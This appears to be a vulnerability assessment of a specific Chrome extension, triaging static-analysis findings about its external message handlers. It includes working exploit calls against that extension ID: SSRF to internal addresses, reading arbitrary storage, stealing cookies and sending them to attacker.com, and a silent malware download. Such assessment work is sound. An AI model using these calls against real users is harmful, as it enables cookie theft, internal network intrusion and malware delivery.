# CoCo Analysis: khcampafifhfdadnneldfbpangcgfamg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 11 (various flows from external messages)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/khcampafifhfdadnneldfbpangcgfamg/opgen_generated_files/bg.js
Line 965: Main message router with chrome.runtime.onMessageExternal listener

**Code:**

```javascript
// Background script - service-worker.js (line 965)
// Main external message listener
chrome.runtime.onMessageExternal.addListener((function(e,t,r){
    Bg_OnMessageLister(e,t,r); // ← Routes all external messages
}));

// Message router function
function Bg_OnMessageLister(e,t,r){
    // ... routing logic ...
    if("SetCacheData"===e.cmd)
        return cache.Lister(e,t,r);
    // ...
}

// Cache handler (Lister$1)
async function Lister$1(e,t,r){
    if("SetCacheData"==e.cmd)
        return(a={})[e.key]=e.value, // ← attacker controls both key and value
        void chrome.storage.local.set(a,(()=>{r(!0)})); // ← writes to storage
    // ...
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted website (e.g., *.taobao.com) or any extension (externally_connectable.ids: "*")
chrome.runtime.sendMessage(
    "khcampafifhfdadnneldfbpangcgfamg",  // Extension ID
    {
        cmd: "SetCacheData",
        key: "malicious_key",
        value: "attacker_controlled_data"
    }
);
```

**Impact:** Attacker can poison extension storage with arbitrary key-value pairs. While storage poisoning alone is typically not exploitable, this extension has a complete exploitation chain through the GetCacheData handler which retrieves and sends back stored data via sendResponse (see Sink 4).

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_remove_sink

**CoCo Trace:**
Line 965: `e.key` flows to `chrome.storage.local.remove(a)`

**Code:**

```javascript
// Cache handler for RemoveCacheData command
async function Lister$1(e,t,r){
    if("RemoveCacheData"==e.cmd){
        var a=[e.key]; // ← attacker-controlled key
        return chrome.storage.local.remove(a),void r();
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages

**Attack:**

```javascript
chrome.runtime.sendMessage(
    "khcampafifhfdadnneldfbpangcgfamg",
    {
        cmd: "RemoveCacheData",
        key: "important_setting"
    }
);
```

**Impact:** Attacker can delete arbitrary storage keys, potentially disrupting extension functionality or removing security-critical settings.

---

## Sink 3: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
Line 965: `e.url` flows to `fetch(e.url,a)`

**Code:**

```javascript
// Fetch handler (Lister$7)
async function Lister$7(e,t,r){
    var a={headers:await http_rule.UpdateRules(e)};
    if(e.method&&(a.method=e.method),
       e.data&&(a.body=e.data),
       e.fetchParams&&(a=e.fetchParams),
       e.type&&"base64"==e.type.toLowerCase())
        return GetBase64(e.url,r); // ← attacker-controlled URL

    fetch(e.url,a) // ← SSRF - attacker controls URL, method, headers, body
        .then((async t=>{
            if(t.ok){
                if(e.textDecoderType){
                    const a=new TextDecoder(e.textDecoderType);
                    var r=await t.arrayBuffer();
                    return a.decode(new Uint8Array(r))
                }
                return t.text()
            }
            throw await t.text()
        }))
        .then((t=>{
            let a=null;
            try{a=JSON.parse(t)}catch(s){}
            var n={result:a||t,resultContent:t,success:!0};
            if(e.isNotNeedClearRules)return r(n);
            http_rule.ClearRules().then((()=>{r(n)})) // ← sends response back to attacker
        }))
        // ...
}

// Message router
function Bg_OnMessageLister(e,t,r){
    if("fetch"===e.cmd||"ajax"===e.cmd)
        return fetch$1.Lister(e,t,r);
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages

**Attack:**

```javascript
// SSRF to internal network
chrome.runtime.sendMessage(
    "khcampafifhfdadnneldfbpangcgfamg",
    {
        cmd: "fetch",
        url: "http://192.168.1.1/admin", // ← internal network
        method: "POST",
        data: "payload",
        headers: {
            "Authorization": "Bearer token"
        }
    },
    function(response) {
        console.log("Internal data:", response.resultContent); // ← attacker receives response
    }
);
```

**Impact:** Server-Side Request Forgery (SSRF) with full control over URL, method, headers, and body. Attacker can:
1. Access internal network resources (192.168.x.x, 10.x.x.x)
2. Scan internal ports
3. Exfiltrate data from internal services
4. Bypass CORS restrictions
5. Receive response data via sendResponse callback

---

## Sink 4: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
Line 752: Storage data flows to sendResponse for external messages

**Code:**

```javascript
// Cache handler for GetCacheData
async function Lister$1(e,t,r){
    if("GetCacheData"==e.cmd){
        chrome.storage.local.get([e.key],(t=>{
            r(t[e.key],t) // ← sends storage data back to external caller
        }))
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages - Information Disclosure

**Attack:**

```javascript
// Complete exploitation chain: Write + Read
// Step 1: Poison storage (see Sink 1)
chrome.runtime.sendMessage(
    "khcampafifhfdadnneldfbpangcgfamg",
    {cmd: "SetCacheData", key: "test", value: "data"}
);

// Step 2: Read any storage key
chrome.runtime.sendMessage(
    "khcampafifhfdadnneldfbpangcgfamg",
    {cmd: "GetCacheData", key: "user_credentials"},
    function(data) {
        console.log("Stolen data:", data); // ← attacker receives stored data
    }
);
```

**Impact:** Information disclosure - attacker can read arbitrary keys from chrome.storage.local, potentially stealing sensitive user data, credentials, or configuration.

---

## Sink 5: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
Line shows cookie data flowing to sendResponse

**Code:**

```javascript
// Cookie handler (Lister$5)
async function Lister$5(e,t,r){
    if("removeCookie"==e.cmd)return removeCookie(e,t,r);
    if("setCookies"==e.cmd)return setCookies(e,t,r);

    // Get all cookies for domain
    for(var a=await chrome.cookies.getAll({domain:e.myDomain}), // ← attacker controls domain
        n=[],s="",o=0;o<a.length;o++){
        var i=a[o],c={name:i.name,value:i.value};
        n[n.length]=c,s=s+c.name+"="+c.value,o<a.length-1&&(s+=";")
    }
    r&&r({cookies:n,cookiesStr:s}) // ← sends cookies back to attacker
}

// Message router
function Bg_OnMessageLister(e,t,r){
    if("getCookies"===e.cmd||"removeCookie"==e.cmd||"setCookies"==e.cmd)
        return cookie.Lister(e,t,r);
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages - Cookie Theft

**Attack:**

```javascript
// Steal cookies from any domain
chrome.runtime.sendMessage(
    "khcampafifhfdadnneldfbpangcgfamg",
    {
        cmd: "getCookies",
        myDomain: "taobao.com"
    },
    function(response) {
        console.log("Stolen cookies:", response.cookiesStr);
        // Send to attacker server
        fetch("https://attacker.com/log", {
            method: "POST",
            body: JSON.stringify(response.cookies)
        });
    }
);
```

**Impact:** Cookie theft from any domain with extension permissions (<all_urls>). Attacker can steal session cookies, authentication tokens, and other sensitive cookie data.

---

## Sink 6: bg_chrome_runtime_MessageExternal → chrome_downloads_download_sink

**Code:**

```javascript
// Download handler (Lister$2)
async function Lister$2(e,t,r){
    var a={url:e.url||e.srcUrl,saveAs:e.saveAs,filename:e.filename}; // ← attacker controls all params
    e.params&&(a=e.params);
    var n=await chrome.downloads.download(a); // ← arbitrary download
    r&&r(n)
}

// Message router
function Bg_OnMessageLister(e,t,r){
    if("download"===e.cmd)
        return download.Lister(e,t,r);
}
```

**Classification:** TRUE POSITIVE

**Attack:**

```javascript
chrome.runtime.sendMessage(
    "khcampafifhfdadnneldfbpangcgfamg",
    {
        cmd: "download",
        url: "https://attacker.com/malware.exe",
        filename: "important_update.exe",
        saveAs: false  // Auto-download without prompt
    }
);
```

**Impact:** Arbitrary file downloads - attacker can trigger downloads of malware or malicious files to user's computer.

---

## Sink 7-11: chrome_storage_local_clear_sink, chrome_storage_sync_clear_sink, chrome_browsingData_remove_sink

**Classification:** FALSE POSITIVE (for these specific sinks)

**Reason:** While CoCo detected flows to these clear/remove sinks, these don't have working exploitable paths via the external message interface based on the code analysis. The extension doesn't expose commands that directly trigger these operations via the Bg_OnMessageLister router.

---

## Overall Assessment

**TRUE POSITIVE** - This extension has multiple critical vulnerabilities due to overly permissive chrome.runtime.onMessageExternal listener combined with powerful permissions:

1. **SSRF with response exfiltration** - Full control over fetch requests
2. **Cookie theft** - Can steal cookies from any domain
3. **Storage exploitation** - Complete read/write control over extension storage
4. **Arbitrary downloads** - Can trigger malicious file downloads
5. **Information disclosure** - Can read sensitive stored data

The extension's externally_connectable manifest allows "*" for extension IDs and many e-commerce domains, making it exploitable by:
- Any other Chrome extension
- Websites matching the 240+ whitelisted domains (taobao.com, jd.com, pinduoduo.com, etc.)

This is a severe security vulnerability with multiple attack vectors and high impact.
